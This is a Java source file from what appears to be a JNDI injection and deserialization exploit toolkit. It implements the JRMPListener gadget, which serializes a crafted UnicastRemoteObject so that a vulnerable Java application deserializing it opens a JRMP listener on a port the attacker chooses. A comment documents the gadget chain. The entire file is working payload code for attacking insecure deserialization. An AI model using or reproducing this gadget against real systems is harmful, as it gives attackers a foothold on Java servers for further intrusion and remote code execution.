package com.nu1r.jndi.gadgets;

import com.nu1r.jndi.enumtypes.PayloadType;
import com.nu1r.jndi.gadgets.utils.Reflections;
import sun.rmi.server.ActivationGroupImpl;
import sun.rmi.server.UnicastServerRef;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.rmi.server.RemoteObject;
import java.rmi.server.RemoteRef;
import java.rmi.server.UnicastRemoteObject;

/**
 * Gadget chain:
 * UnicastRemoteObject.readObject(ObjectInputStream) line: 235
 * UnicastRemoteObject.reexport() line: 266
 * UnicastRemoteObject.exportObject(Remote, int) line: 320
 * UnicastRemoteObject.exportObject(Remote, UnicastServerRef) line: 383
 * UnicastServerRef.exportObject(Remote, Object, boolean) line: 208
 * LiveRef.exportObject(Target) line: 147
 * TCPEndpoint.exportObject(Target) line: 411
 * TCPTransport.exportObject(Target) line: 249
 * TCPTransport.listen() line: 319
 * <p>
 * Requires:
 * - JavaSE
 * <p>
 * Argument:
 * - Port number to open listener to
 */
public class JRMPListener implements ObjectPayload<UnicastRemoteObject>{

    public byte[] getBytes(PayloadType type, String... param) throws Exception {
        String command = param[0];
        int jrmpPort = Integer.parseInt(command);
        UnicastRemoteObject uro = Reflections.createWithConstructor(ActivationGroupImpl.class, RemoteObject.class, new Class[]{
                RemoteRef.class
        }, new Object[]{
                new UnicastServerRef(jrmpPort)
        });

        Reflections.getField(UnicastRemoteObject.class, "port").set(uro, jrmpPort);

        //序列化
        ByteArrayOutputStream baous = new ByteArrayOutputStream();
        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
        oos.writeObject(uro);
        byte[] bytes = baous.toByteArray();
        oos.close();

        return bytes;
    }

    @Override
    public UnicastRemoteObject getObject(String command) throws Exception {
        return null;
    }
}
